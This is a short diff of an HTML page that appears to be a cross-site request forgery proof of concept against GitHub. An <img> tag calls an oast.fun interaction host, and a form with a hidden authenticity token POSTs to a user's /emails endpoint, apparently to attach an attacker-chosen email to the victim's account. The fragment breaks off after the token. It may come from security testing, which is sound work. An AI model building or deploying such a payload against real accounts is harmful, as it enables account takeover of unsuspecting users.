@@ -1,4 +1,4 @@
-<img src="sufnndtwiifkfspbgghcy2326lfecaosl.oast.fun"
+<img src="sufnndtwiifkfspbgghcy2326lfecaosl.oast.fun">
 	<body>
 		<form method="POST" action="https://github.com/users/rubygems1234/emails">
 			<input type="hidden" name="authenticity_token" value="DJLXsKnSqjAcvEg-6Bhu0yOe5xAQutCHFz7zjpsPoVosJXTswJsInYR8-kavsCY50O7jeO7zuk-ZkTao9gmi_Q"/>
